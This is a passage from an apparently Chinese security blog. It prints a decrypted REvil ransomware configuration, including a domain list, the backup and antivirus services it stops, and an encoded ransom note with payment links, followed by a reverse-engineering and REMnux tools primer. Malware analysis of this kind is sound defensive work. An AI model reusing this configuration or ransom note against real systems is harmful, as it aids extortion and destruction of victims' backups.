loydconstruction.com;ra-staudte.de;mbxvii.com;tecnojobsnet.com;starsarecircular.org;twohourswithlena.wordpress.com;stoeferlehalle.de;merzi.info;garage-lecompte-rouen.fr;hypozentrum.com;nestor-swiss.ch;thomasvicino.com;kmbshipping.co.uk;denovofoodsgroup.com;planchaavapor.net;dr-pipi.de;qlog.de;lynsayshepherd.co.uk;aco-media.nl;abogadoengijon.es;bestbet.com;liliesandbeauties.org;norovirus-ratgeber.de;thee.network;stacyloeb.com;bundabergeyeclinic.com.au;sandd.nl;americafirstcommittee.org;milanonotai.it;kevinjodea.com;easytrans.com.au;westdeptfordbuyrite.com;carriagehousesalonvt.com;operaslovakia.sk;corelifenutrition.com;hashkasolutindo.com;compliancesolutionsstrategies.com;edgewoodestates.org;mastertechengineering.com;pinkexcel.com;cnoia.org;aprepol.com;rieed.de;katketytaanet.fi;lascuola.nl;assurancesalextrespaille.fr;paymybill.guru;xoabigail.com;ligiercenter-sachsen.de;answerstest.ru;airconditioning-waalwijk.nl;pixelarttees.com;freie-gewerkschaften.de;dnepr-beskid.com.ua;eco-southafrica.com;dutchcoder.nl;iphoneszervizbudapest.hu;allentownpapershow.com;bingonearme.org;summitmarketingstrategies.com;completeweddingkansas.com;wolf-glas-und-kunst.de;employeesurveys.com;scenepublique.net;monark.com;seitzdruck.com;alvinschwartz.wordpress.com;knowledgemuseumbd.com;spd-ehningen.de;boosthybrid.com.au;launchhubl.com;revezlimage.com;dontpassthepepper.com;petnest.ir;associacioesportivapolitg.cat;12starhd.online;jerling.de;kaotikkustomz.com;sarbatkhalsafoundation.org;solinegraphic.com;skiltogprint.no;craigmccabe.fun;puertamatic.es;mylovelybluesky.com;run4study.com;pierrehale.com;cactusthebrand.com;101gowrie.com;nicoleaeschbachorg.wordpress.com;architekturbuero-wagner.net;mindpackstudios.com;vitavia.lt;bouncingbonanza.com;lukeshepley.wordpress.com;igfap.com;bockamp.com;levihotelspa.fi;exenberger.at;tinyagency.com;familypark40.com;alfa-stroy72.com;boompinoy.com;mdacares.com;architecturalfiberglass.org;slupetzky.at;sinal.org;qualitus.com;deepsouthclothingcompany.com;groupe-frayssinet.fr;synlab.lt;kamienny-dywan24.pl;ilcdover.com;humancondition.com;insigniapmg.com;arteservicefabbro.com;team-montage.dk;iviaggisonciliegie.it;austinlchurch.com;rehabilitationcentersinhouston.net;zervicethai.co.th;vickiegrayimages.com;ziegler-praezisionsteile.de;crediacces.com;comarenterprises.com;courteney-cox.net;trapiantofue.it;space.ua;odiclinic.org;noesis.tech;urmasiimariiuniri.ro;8449nohate.org;xltyu.com;kikedeoliveira.com;remcakram.com;degroenetunnel.com;strandcampingdoonbeg.com;haar-spange.com;pmcimpact.com;ceid.info.tr;gemeentehetkompas.nl;stopilhan.com;dareckleyministries.com;sportverein-tambach.de;ivivo.es;braffinjurylawfirm.com;pcprofessor.com;bordercollie-nim.nl;hrabritelefon.hr;ctrler.cn;makeitcount.at;foryourhealth.live;seproc.hn;ianaswanson.com;nijaplay.com;brandl-blumen.de;lubetkinmediacompanies.com;ouryoungminds.wordpress.com;micro-automation.de;apprendrelaudit.com;securityfmm.com;geisterradler.de;morawe-krueger.de;nmiec.com;sla-paris.com;figura.team;vitalyscenter.es;jvanvlietdichter.nl;crosspointefellowship.church;handi-jack-llc.com;femxarxa.cat;wsoil.com.sg;xlarge.at;groupe-cets.com;admos-gleitlager.de;liikelataamo.fi;sevenadvertising.com;nancy-informatique.fr;ateliergamila.com;stefanpasch.me;wacochamber.com;aurum-juweliere.de;hatech.io;centuryrs.com;ilive.lt;fensterbau-ziegler.de;zflas.com;thefixhut.com;goodgirlrecovery.com;botanicinnovations.com;saxtec.com;tips.technology;smalltownideamill.wordpress.com;pt-arnold.de;tarotdeseidel.com;bildungsunderlebnis.haus;brevitempore.net;imadarchid.com;sportiomsportfondsen.nl;digivod.de;darrenkeslerministries.com;smhydro.com.pl;echtveilig.nl;schlafsack-test.net;galserwis.pl;eraorastudio.com;faroairporttransfers.net;connectedace.com;pcp-nc.com;jyzdesign.com;suncrestcabinets.ca;offroadbeasts.com;teresianmedia.org;greenfieldoptimaldentalcare.com;thomas-hospital.de;embracinghiscall.com;ralister.co.uk;rosavalamedahr.com;quizzingbee.com;richard-felix.co.uk;sipstroysochi.ru;todocaracoles.com;shiftinspiration.com;campusoutreach.org;bodyforwife.com;katiekerr.co.uk;sportsmassoren.com;trystana.com;ino-professional.ru;slashdb.com;selfoutlet.com;personalenhancementcenter.com;proudground.org;walkingdeadnj.com;d1franchise.com;anthonystreetrimming.com;forskolorna.org;brawnmediany.com;uimaan.fi;journeybacktolife.com;pferdebiester.de;kao.at;asteriag.com;hvccfloorcare.com;parks-nuernberg.de;div-vertriebsforschung.de;centromarysalud.com;asiluxury.com;chrissieperry.com;verbisonline.com;onlybacklink.com;radaradvies.nl;daklesa.de;sagadc.com;waveneyrivercentre.co.uk;mytechnoway.com;fitnessbazaar.com;fibrofolliculoma.info;fayrecreations.com;maryloutaylor.com;whyinterestingly.ru;maratonaclubedeportugal.com;maineemploymentlawyerblog.com;kosterra.com;blumenhof-wegleitner.at;punchbaby.com;wmiadmin.com;bxdf.info;harveybp.com;vermoote.de;johnsonfamilyfarmblog.wordpress.com;plastidip.com.ar;autofolierung-lu.de;highimpactoutdoors.net;cwsitservices.co.uk;hairstylesnow.site;mymoneyforex.com;victoriousfestival.co.uk;farhaani.com;web.ion.ag;simoneblum.de;carolinepenn.com;blacksirius.de;trackyourconstruction.com;naturavetal.hr;heliomotion.com;rollingrockcolumbia.com;judithjansen.com;poultrypartners.nl;mirjamholleman.nl;baumkuchenexpo.jp;insidegarage.pl;irishmachineryauctions.com;intecwi.com;porno-gringo.com;penco.ie;jacquin-maquettes.com;anteniti.com;hebkft.hu;ftlc.es;dutchbrewingcoffee.com;behavioralmedicinespecialists.com;socialonemedia.com;cirugiauretra.es;c-a.co.in;nokesvilledentistry.com;chandlerpd.com;aunexis.ch;gmto.fr;berliner-versicherungsvergleich.de;jsfg.com;vesinhnha.com.vn;joyeriaorindia.com;greenko.pl;cerebralforce.net;rota-installations.co.uk;presseclub-magdeburg.de;yamalevents.com;renergysolution.com;roygolden.com;verifort-capital.de;delawarecorporatelaw.com;jiloc.com;icpcnj.org;1kbk.com.ua;noixdecocom.fr;entopic.com;hellohope.com;flexicloud.hk;danielblum.info;thaysa.com;mdk-mediadesign.de;nataschawessels.com;smale-opticiens.nl;charlesreger.com;kaliber.co.jp;almosthomedogrescue.dog;reddysbakery.com;waynela.com;ahouseforlease.com;binder-buerotechnik.at;happyeasterimages.org;dr-tremel-rednitzhembach.de;mikeramirezcpa.com;zweerscreatives.nl;dramagickcom.wordpress.com;commercialboatbuilding.com;argenblogs.com.ar;heurigen-bauer.at;ogdenvision.com;gadgetedges.com;izzi360.com;turkcaparbariatrics.com;spargel-kochen.de;pridoxmaterieel.nl;heidelbergartstudio.gallery;ftf.or.at;kaminscy.com;filmvideoweb.com;meusharklinithome.wordpress.com;xn--thucmctc-13a1357egba.com;tstaffing.nl;abogadosadomicilio.es;igorbarbosa.com;homesdollar.com;ncuccr.org;caffeinternet.it;abogados-en-alicante.es;evologic-technologies.com;oslomf.no;desert-trails.com;gastsicht.de;nvwoodwerks.com;slwgs.org;vorotauu.ru;lionware.de;bodyfulls.com;myhostcloud.com;amylendscrestview.com;bptdmaluku.com;bogdanpeptine.ro;perbudget.com;strategicstatements.com;simpliza.com;innote.fi;365questions.org;sanyue119.com;walter-lemm.de;cuppacap.com;teknoz.net;layrshift.eu;blog.solutionsarchitect.guru;parkcf.nl;themadbotter.com;upmrkt.co;modelmaking.nl;nandistribution.nl;ledmes.ru;coding-marking.com;sachnendoc.com;thedad.com;mercantedifiori.com;artotelamsterdam.com;plotlinecreative.com;bauertree.com;woodleyacademy.org;dw-css.de;leda-ukraine.com.ua;destinationclients.fr;jasonbaileystudio.com;cheminpsy.fr;devstyle.org;kindersitze-vergleich.de;live-con-arte.de;bee4win.com;fiscalsort.com;jeanlouissibomana.com;huehnerauge-entfernen.de;eadsmurraypugh.com;fotoscondron.com;DupontSellsHomes.com;brigitte-erler.com;imperfectstore.com;shonacox.com;nacktfalter.de;devok.info;esope-formation.fr;mariposapropaneaz.com;sw1m.ru;mrtour.site;hannah-fink.de;bafuncs.org;kampotpepper.gives;ampisolabergeggi.it;cuspdental.com;philippedebroca.com;abitur-undwieweiter.de;hoteledenpadova.it;tanciu.com;delchacay.com.ar;cortec-neuro.com;theshungiteexperience.com.au;deschl.net;biortaggivaldelsa.com;fitnessingbyjessica.com;dsl-ip.de;officehymy.com;shadebarandgrillorlando.com;bargningharnosand.se;mmgdouai.fr;daniel-akermann-architektur-und-planung.ch;xn--logopdie-leverkusen-kwb.de;buroludo.nl;ymca-cw.org.uk;executiveairllc.com;allamatberedare.se;servicegsm.net;kingfamily.construction;nakupunafoundation.org;henricekupper.com;shsthepapercut.com;lbcframingelectrical.com;ladelirante.fr;clos-galant.com;dr-seleznev.com;siliconbeach-realestate.com;tanzprojekt.com;fatfreezingmachines.com;kamahouse.net;gratispresent.se;softsproductkey.com;marathonerpaolo.com;gopackapp.com;manutouchmassage.com;marketingsulweb.com;craigvalentineacademy.com;catholicmusicfest.com;gaiam.nl;woodworkersolution.com;pasivect.co.uk;cyntox.com;advizewealth.com;y-archive.com;saarland-thermen-resort.com;fizzl.ru;oemands.dk;mrsfieldskc.com;levdittliv.se;rksbusiness.com;sexandfessenjoon.wordpress.com;first-2-aid-u.com;simpkinsedwards.co.uk;the-domain-trader.com;rocketccw.com;celeclub.org;urist-bogatyr.ru;lapinvihreat.fi;ecpmedia.vn;zieglerbrothers.de;piajeppesen.dk;joseconstela.com;carlosja.com;real-estate-experts.com;toreria.es;analiticapublica.es;kariokids.com;leeuwardenstudentcity.nl;psc.de;tetinfo.in;ai-spt.jp;homng.net;em-gmbh.ch;trulynolen.co.uk;oceanastudios.com;csgospeltips.se;luxurytv.jp;abuelos.com;birnam-wood.com;theletter.company;bbsmobler.se;restaurantesszimmer.de;insp.bi;besttechie.com;autodujos.lt;chaotrang.com;galleryartfair.com;321play.com.hk;saka.gr;tandartspraktijkhartjegroningen.nl;steampluscarpetandfloors.com;waermetauscher-berechnen.de;sterlingessay.com;justinvieira.com;waywithwords.net;shiresresidential.com;naswrrg.org;spinheal.ru;slimani.net;modestmanagement.com;triggi.de;cityorchardhtx.com;narcert.com&quot;,</span><br><span class="line">    &quot;net&quot;: false,</span><br><span class="line">    &quot;svc&quot;: [</span><br><span class="line">        &quot;veeam&quot;,</span><br><span class="line">        &quot;memtas&quot;,</span><br><span class="line">        &quot;sql&quot;,</span><br><span class="line">        &quot;backup&quot;,</span><br><span class="line">        &quot;vss&quot;,</span><br><span class="line">        &quot;sophos&quot;,</span><br><span class="line">        &quot;svc$&quot;,</span><br><span class="line">        &quot;mepocs&quot;</span><br><span class="line">    ],</span><br><span class="line">    &quot;nbody&quot;: &quot;LQAtAC0APQA9AD0AIABXAGUAbABjAG8AbQBlAC4AIABBAGcAYQBpAG4ALgAgAD0APQA9AC0ALQAtAA0ACgANAAoAWwAtAF0AIABXAGgAYQB0AHMAIABIAGEAcABQAGUAbgA/ACAAWwAtAF0ADQAKAA0ACgBZAG8AdQByACAAZgBpAGwAZQBzACAAYQByAGUAIABlAG4AYwByAHkAcAB0AGUAZAAsACAAYQBuAGQAIABjAHUAcgByAGUAbgB0AGwAeQAgAHUAbgBhAHYAYQBpAGwAYQBiAGwAZQAuACAAWQBvAHUAIABjAGEAbgAgAGMAaABlAGMAawAgAGkAdAA6ACAAYQBsAGwAIABmAGkAbABlAHMAIABvAG4AIAB5AG8AdQByACAAcwB5AHMAdABlAG0AIABoAGEAcwAgAGUAeAB0AGUAbgBzAGkAbwBuACAAewBFAFgAVAB9AC4ADQAKAEIAeQAgAHQAaABlACAAdwBhAHkALAAgAGUAdgBlAHIAeQB0AGgAaQBuAGcAIABpAHMAIABwAG8AcwBzAGkAYgBsAGUAIAB0AG8AIAByAGUAYwBvAHYAZQByACAAKAByAGUAcwB0AG8AcgBlACkALAAgAGIAdQB0ACAAeQBvAHUAIABuAGUAZQBkACAAdABvACAAZgBvAGwAbABvAHcAIABvAHUAcgAgAGkAbgBzAHQAcgB1AGMAdABpAG8AbgBzAC4AIABPAHQAaABlAHIAdwBpAHMAZQAsACAAeQBvAHUAIABjAGEAbgB0ACAAcgBlAHQAdQByAG4AIAB5AG8AdQByACAAZABhAHQAYQAgACgATgBFAFYARQBSACkALgANAAoADQAKAFsAKwBdACAAVwBoAGEAdAAgAGcAdQBhAHIAYQBuAHQAZQBlAHMAPwAgAFsAKwBdAA0ACgANAAoASQB0AHMAIABqAHUAcwB0ACAAYQAgAGIAdQBzAGkAbgBlAHMAcwAuACAAVwBlACAAYQBiAHMAbwBsAHUAdABlAGwAeQAgAGQAbwAgAG4AbwB0ACAAYwBhAHIAZQAgAGEAYgBvAHUAdAAgAHkAbwB1ACAAYQBuAGQAIAB5AG8AdQByACAAZABlAGEAbABzACwAIABlAHgAYwBlAHAAdAAgAGcAZQB0AHQAaQBuAGcAIABiAGUAbgBlAGYAaQB0AHMALgAgAEkAZgAgAHcAZQAgAGQAbwAgAG4AbwB0ACAAZABvACAAbwB1AHIAIAB3AG8AcgBrACAAYQBuAGQAIABsAGkAYQBiAGkAbABpAHQAaQBlAHMAIAAtACAAbgBvAGIAbwBkAHkAIAB3AGkAbABsACAAbgBvAHQAIABjAG8AbwBwAGUAcgBhAHQAZQAgAHcAaQB0AGgAIAB1AHMALgAgAEkAdABzACAAbgBvAHQAIABpAG4AIABvAHUAcgAgAGkAbgB0AGUAcgBlAHMAdABzAC4ADQAKAFQAbwAgAGMAaABlAGMAawAgAHQAaABlACAAYQBiAGkAbABpAHQAeQAgAG8AZgAgAHIAZQB0AHUAcgBuAGkAbgBnACAAZgBpAGwAZQBzACwAIABZAG8AdQAgAHMAaABvAHUAbABkACAAZwBvACAAdABvACAAbwB1AHIAIAB3AGUAYgBzAGkAdABlAC4AIABUAGgAZQByAGUAIAB5AG8AdQAgAGMAYQBuACAAZABlAGMAcgB5AHAAdAAgAG8AbgBlACAAZgBpAGwAZQAgAGYAbwByACAAZgByAGUAZQAuACAAVABoAGEAdAAgAGkAcwAgAG8AdQByACAAZwB1AGEAcgBhAG4AdABlAGUALgANAAoASQBmACAAeQBvAHUAIAB3AGkAbABsACAAbgBvAHQAIABjAG8AbwBwAGUAcgBhAHQAZQAgAHcAaQB0AGgAIABvAHUAcgAgAHMAZQByAHYAaQBjAGUAIAAtACAAZgBvAHIAIAB1AHMALAAgAGkAdABzACAAZABvAGUAcwAgAG4AbwB0ACAAbQBhAHQAdABlAHIALgAgAEIAdQB0ACAAeQBvAHUAIAB3AGkAbABsACAAbABvAHMAZQAgAHkAbwB1AHIAIAB0AGkAbQBlACAAYQBuAGQAIABkAGEAdABhACwAIABjAGEAdQBzAGUAIABqAHUAcwB0ACAAdwBlACAAaABhAHYAZQAgAHQAaABlACAAcAByAGkAdgBhAHQAZQAgAGsAZQB5AC4AIABJAG4AIABwAHIAYQBjAHQAaQBjAGUAIAAtACAAdABpAG0AZQAgAGkAcwAgAG0AdQBjAGgAIABtAG8AcgBlACAAdgBhAGwAdQBhAGIAbABlACAAdABoAGEAbgAgAG0AbwBuAGUAeQAuAA0ACgANAAoAWwArAF0AIABIAG8AdwAgAHQAbwAgAGcAZQB0ACAAYQBjAGMAZQBzAHMAIABvAG4AIAB3AGUAYgBzAGkAdABlAD8AIABbACsAXQANAAoADQAKAFkAbwB1ACAAaABhAHYAZQAgAHQAdwBvACAAdwBhAHkAcwA6AA0ACgANAAoAMQApACAAWwBSAGUAYwBvAG0AbQBlAG4AZABlAGQAXQAgAFUAcwBpAG4AZwAgAGEAIABUAE8AUgAgAGIAcgBvAHcAcwBlAHIAIQANAAoAIAAgAGEAKQAgAEQAbwB3AG4AbABvAGEAZAAgAGEAbgBkACAAaQBuAHMAdABhAGwAbAAgAFQATwBSACAAYgByAG8AdwBzAGUAcgAgAGYAcgBvAG0AIAB0AGgAaQBzACAAcwBpAHQAZQA6ACAAaAB0AHQAcABzADoALwAvAHQAbwByAHAAcgBvAGoAZQBjAHQALgBvAHIAZwAvAA0ACgAgACAAYgApACAATwBwAGUAbgAgAG8AdQByACAAdwBlAGIAcwBpAHQAZQA6ACAAaAB0AHQAcAA6AC8ALwBhAHAAbABlAGIAegB1ADQANwB3AGcAYQB6AGEAcABkAHEAawBzADYAdgByAGMAdgA2AHoAYwBuAGoAcABwAGsAYgB4AGIAcgA2AHcAawBlAHQAZgA1ADYAbgBmADYAYQBxADIAbgBtAHkAbwB5AGQALgBvAG4AaQBvAG4ALwB7AFUASQBEAH0ADQAKAA0ACgAyACkAIABJAGYAIABUAE8AUgAgAGIAbABvAGMAawBlAGQAIABpAG4AIAB5AG8AdQByACAAYwBvAHUAbgB0AHIAeQAsACAAdAByAHkAIAB0AG8AIAB1AHMAZQAgAFYAUABOACEAIABCAHUAdAAgAHkAbwB1ACAAYwBhAG4AIAB1AHMAZQAgAG8AdQByACAAcwBlAGMAbwBuAGQAYQByAHkAIAB3AGUAYgBzAGkAdABlAC4AIABGAG8AcgAgAHQAaABpAHMAOgANAAoAIAAgAGEAKQAgAE8AcABlAG4AIAB5AG8AdQByACAAYQBuAHkAIABiAHIAbwB3AHMAZQByACAAKABDAGgAcgBvAG0AZQAsACAARgBpAHIAZQBmAG8AeAAsACAATwBwAGUAcgBhACwAIABJAEUALAAgAEUAZABnAGUAKQANAAoAIAAgAGIAKQAgAE8AcABlAG4AIABvAHUAcgAgAHMAZQBjAG8AbgBkAGEAcgB5ACAAdwBlAGIAcwBpAHQAZQA6ACAAaAB0AHQAcAA6AC8ALwBkAGUAYwBvAGQAZQByAC4AcgBlAC8AewBVAEkARAB9AA0ACgANAAoAVwBhAHIAbgBpAG4AZwA6ACAAcwBlAGMAbwBuAGQAYQByAHkAIAB3AGUAYgBzAGkAdABlACAAYwBhAG4AIABiAGUAIABiAGwAbwBjAGsAZQBkACwAIAB0AGgAYQB0AHMAIAB3AGgAeQAgAGYAaQByAHMAdAAgAHYAYQByAGkAYQBuAHQAIABtAHUAYwBoACAAYgBlAHQAdABlAHIAIABhAG4AZAAgAG0AbwByAGUAIABhAHYAYQBpAGwAYQBiAGwAZQAuAA0ACgANAAoAVwBoAGUAbgAgAHkAbwB1ACAAbwBwAGUAbgAgAG8AdQByACAAdwBlAGIAcwBpAHQAZQAsACAAcAB1AHQAIAB0AGgAZQAgAGYAbwBsAGwAbwB3AGkAbgBnACAAZABhAHQAYQAgAGkAbgAgAHQAaABlACAAaQBuAHAAdQB0ACAAZgBvAHIAbQA6AA0ACgBLAGUAeQA6AA0ACgANAAoADQAKAHsASwBFAFkAfQANAAoADQAKAA0ACgAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ALQAtAC0ADQAKAA0ACgAhACEAIQAgAEQAQQBOAEcARQBSACAAIQAhACEADQAKAEQATwBOACcAVAAgAHQAcgB5ACAAdABvACAAYwBoAGEAbgBnAGUAIABmAGkAbABlAHMAIABiAHkAIAB5AG8AdQByAHMAZQBsAGYALAAgAEQATwBOACcAVAAgAHUAcwBlACAAYQBuAHkAIAB0AGgAaQByAGQAIABwAGEAcgB0AHkAIABzAG8AZgB0AHcAYQByAGUAIABmAG8AcgAgAHIAZQBzAHQAbwByAGkAbgBnACAAeQBvAHUAcgAgAGQAYQB0AGEAIABvAHIAIABhAG4AdABpAHYAaQByAHUAcwAgAHMAbwBsAHUAdABpAG8AbgBzACAALQAgAGkAdABzACAAbQBhAHkAIABlAG4AdABhAGkAbAAgAGQAYQBtAGEAZwBlACAAbwBmACAAdABoAGUAIABwAHIAaQB2AGEAdABlACAAawBlAHkAIABhAG4AZAAsACAAYQBzACAAcgBlAHMAdQBsAHQALAAgAFQAaABlACAATABvAHMAcwAgAGEAbABsACAAZABhAHQAYQAuAA0ACgAhACEAIQAgACEAIQAhACAAIQAhACEADQAKAE8ATgBFACAATQBPAFIARQAgAFQASQBNAEUAOgAgAEkAdABzACAAaQBuACAAeQBvAHUAcgAgAGkAbgB0AGUAcgBlAHMAdABzACAAdABvACAAZwBlAHQAIAB5AG8AdQByACAAZgBpAGwAZQBzACAAYgBhAGMAawAuACAARgByAG8AbQAgAG8AdQByACAAcwBpAGQAZQAsACAAdwBlACAAKAB0AGgAZQAgAGIAZQBzAHQAIABzAHAAZQBjAGkAYQBsAGkAcwB0AHMAKQAgAG0AYQBrAGUAIABlAHYAZQByAHkAdABoAGkAbgBnACAAZgBvAHIAIAByAGUAcwB0AG8AcgBpAG4AZwAsACAAYgB1AHQAIABwAGwAZQBhAHMAZQAgAHMAaABvAHUAbABkACAAbgBvAHQAIABpAG4AdABlAHIAZgBlAHIAZQAuAA0ACgAhACEAIQAgACEAIQAhACAAIQAhACEAAAA=&quot;,</span><br><span class="line">    &quot;nname&quot;: &quot;&#123;EXT&#125;-readme.txt&quot;,</span><br><span class="line">    &quot;exp&quot;: false,</span><br><span class="line">    &quot;img&quot;: &quot;QQBsAGwAIABvAGYAIAB5AG8AdQByACAAZgBpAGwAZQBzACAAYQByAGUAIABlAG4AYwByAHkAcAB0AGUAZAAhAA0ACgANAAoARgBpAG4AZAAgAHsARQBYAFQAfQAtAHIAZQBhAGQAbQBlAC4AdAB4AHQAIABhAG4AZAAgAGYAbwBsAGwAbwB3ACAAaQBuAHMAdAB1AGMAdABpAG8AbgBzAAAA&quot;,</span><br><span class="line">    &quot;arn&quot;: false,</span><br><span class="line">    &quot;rdmcnt&quot;: 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>這隻REvil會根據組態設定檔去做事最後再丟一個文件出來</p>
<blockquote>
<p>The REvil will do something based on the configuration file and finally throw a file out</p>
</blockquote>
<p><img src="https://i.imgur.com/IDfAGNX.png" alt="https://i.imgur.com/IDfAGNX.png"></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-Reverse" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/Reverse/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.092Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/Reverse/">
        Reverse &amp; IDA
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><p>盡可能還原程式碼，以利分析程式的演算法跟函式</p>
<p><a target="_blank" rel="noopener" href="https://hackmd.io/@yp6CBnh0Qg-d0nsWrmIGZw/ryf4glefs/https%3A%2F%2Fhackmd.io%2F%40yp6CBnh0Qg-d0nsWrmIGZw%2Fr1cOVyezi">https://hackmd.io/@yp6CBnh0Qg-d0nsWrmIGZw/ryf4glefs/https%3A%2F%2Fhackmd.io%2F%40yp6CBnh0Qg-d0nsWrmIGZw%2Fr1cOVyezi</a></p>
<p>反編譯: 分析已有的二進制文件，推倒原始設計跟實現的過程</p>
<p>用於: 保護知識產權、解析文件跟恢復數據</p>
<p><img src="img/rev_Untitled.png" alt="Untitled"></p>
<p>編譯: 元碼轉換電腦能執行的程式</p>
<p>組譯：將組合語言轉換成可執行的檔案。</p>
<p><img src="img/rev_Untitled_1.png" alt="Untitled"></p>
<p>動態分析</p>
<ul>
<li>在程式執行期間一邊分析程式當下運行狀況</li>
<li>分析暫存器、記憶體等元件的變化</li>
<li>gdb<ul>
<li>GNU Debugger</li>
<li>只有文字</li>
<li>有peda</li>
<li>gdb filename 用gdb開啟file</li>
<li>run 使程式跑起來，跑到斷點或程式結束(記得設定斷點)</li>
<li>break 設斷點<ul>
<li>break *addr</li>
<li>break *fun_name</li>
</ul>
</li>
<li>Info fun<ul>
<li>顯示所有fun</li>
</ul>
</li>
<li>ni nexti 執行下一行指令</li>
<li>si stepi 進入function call</li>
<li>Continue 繼續執行到下一個斷點或結束</li>
<li>disassemble function 返組譯函式</li>
<li>info register 顯示所有暫存器內容</li>
<li>修改暫存<ul>
<li>set *addr = value</li>
<li>set $register = value</li>
<li>info break(ib)下過的中斷點訊息</li>
<li>delete(del) 清除所有中斷</li>
<li>del num 刪除特定斷點<ul>
<li>num依據ib的號碼為準</li>
</ul>
</li>
<li>duit(q) 離開gdb</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>靜態分析</p>
<ul>
<li>分析時沒有執行</li>
<li>單純從程式碼、組合語言、static data分析</li>
<li>ghidra</li>
<li>IDA</li>
</ul>
<hr>
<hr>
<h2 id="IDA-start"><a href="#IDA-start" class="headerlink" title="IDA start"></a>IDA start</h2><p><a target="_blank" rel="noopener" href="https://docs.remnux.org/install-distro/get-virtual-appliance">https://docs.remnux.org/install-distro/get-virtual-appliance</a></p>
<h3 id="Get-Started-with-REMnux"><a href="#Get-Started-with-REMnux" class="headerlink" title="Get Started with REMnux"></a>Get Started with REMnux</h3><ul>
<li>Get REMnux as a virtual appliance, install the distro</li>
<li>on a dedicated system, or add it to an existing one.</li>
<li>Review REMnux documentation at docs.remnux.org.</li>
<li>Keep your system up to date by periodically running</li>
<li>“remnux upgrade” and “remnux update”.</li>
<li>Become familiar with REMnux malware analysis tools</li>
<li>available as Docker images.</li>
<li>Know default logon credentials: remnux/malware</li>
</ul>
<h3 id="Operate-Your-REMnux-System"><a href="#Operate-Your-REMnux-System" class="headerlink" title="Operate Your REMnux System"></a>Operate Your REMnux System</h3><p>Shut down the system</p>
<p>Reboot the system </p>
<p>Switch to a root</p>
<p>Renew DHCP lease</p>
<p>See current IP address </p>
<p>Edit a text file</p>
<p>View an image file</p>
<p>Start web server</p>
<p>Start SSH server</p>
<p>shutdown</p>
<p>reboot</p>
<p>shell sudo -s</p>
<p>renew-dhcp</p>
<p>myip</p>
<p>code file</p>
<p>feh file</p>
<p>httpd start</p>
<p>sshd start</p>
<h3 id="Analyze-Windows-Executables"><a href="#Analyze-Windows-Executables" class="headerlink" title="Analyze Windows Executables"></a>Analyze Windows Executables</h3><ul>
<li><strong>Static Properties:</strong> manalyze, peframe, pefile, exiftool, clamscan, pescan, portex, bearcommander, pecheck</li>
<li><strong>Strings and Deobfuscation:</strong> pestr, bbcrack, brxor.py, base64dump, xorsearch, flarestrings, floss, cyberchef</li>
<li><strong>Code Emulation:</strong> binee, capa, vivbin</li>
<li><strong>Disassemble/Decompile:</strong> ghidra, cutter, objdump, r2 unpacking, bytehist, de4dot, upx</li>
</ul>
<h3 id="Reverse-Engineer-Linux-Binaries"><a href="#Reverse-Engineer-Linux-Binaries" class="headerlink" title="Reverse-Engineer Linux Binaries"></a>Reverse-Engineer Linux Binaries</h3><p><strong>Static Properties:</strong> trid, exiftool, pyew, readelf.py</p>
<p><strong>Disassemble/Decompile:</strong> ghidra, cutter, objdump, r2</p>
<p><strong>Debugging:</strong> edg, gdb</p>
<p><strong>Behavior Analysis:</strong> ltrace, strace, frida, sysdig, unhide</p>
<h3 id="Investigate-Other-Forms-of-Malicious-Code"><a href="#Investigate-Other-Forms-of-Malicious-Code" class="headerlink" title="Investigate Other Forms of Malicious Code"></a>Investigate Other Forms of Malicious Code</h3><p><strong>Android:</strong> apktool, droidlysis, androgui.py, baksmali, dex2jar</p>
<p><strong>Java:</strong> cfr, procyon, jad, jd-gui, idx_parser.py</p>
<p><strong>Python:</strong> pyinstxtractor.py, pycdc</p>
<p><strong>JavaScript:</strong> js, js-file, objects.js, box-js</p>
<p><strong>Shellcode:</strong> shellcode2exe.bat, scdbg, xorsearch</p>
<p><strong>PowerShell:</strong> pwsh, base64dump</p>
<p><strong>Flash:</strong> swfdump, flare, flasm, swf_mastah, xxxswf</p>
<h3 id="Examine-Suspicious-Documents"><a href="#Examine-Suspicious-Documents" class="headerlink" title="Examine Suspicious Documents"></a><strong>Examine Suspicious Documents</strong></h3><p><strong>Microsoft Office Files:</strong> vmonkey, pcodedmp, olevba, xlmdeobfuscator, oledump.py, msoffice-crypt, ssview</p>
<p><strong>RTF Files:</strong> rtfobj, rtfdump</p>
<p>Email Messages: emldump, msgconvert</p>
<p><strong>PDF Files:</strong> pdftk,pdfparser,pdfextract,pdfdecrypt,peepdf,pdftk,pdfresurrect,pgdf,pdfobjflow</p>
<p><strong>General:</strong> base64dump, tesseract, exiftool</p>
<h3 id="Explore-Network-Interactions"><a href="#Explore-Network-Interactions" class="headerlink" title="Explore Network Interactions"></a><strong>Explore Network Interactions</strong></h3><p><strong>Monitoring:</strong> burpsuite, networkminer, polarproxy, mitmproxy, wireshark, tshark, ngrep, tcpxtract</p>
<p><strong>Connecting:</strong> thug, nc, tor, wget, curl, irc, ssh, unfurl</p>
<p><strong>Services:</strong> fakedns,fakemail,accept-all-ips, nc, httpd,inetsim,fakenet,sshd,myip</p>
<h3 id="Gather-and-Analyze-Data"><a href="#Gather-and-Analyze-Data" class="headerlink" title="Gather and Analyze Data"></a>Gather and Analyze Data</h3><p><strong>Network:</strong> Automater.py, shodan, ipwhois_cli.py, pdnstool</p>
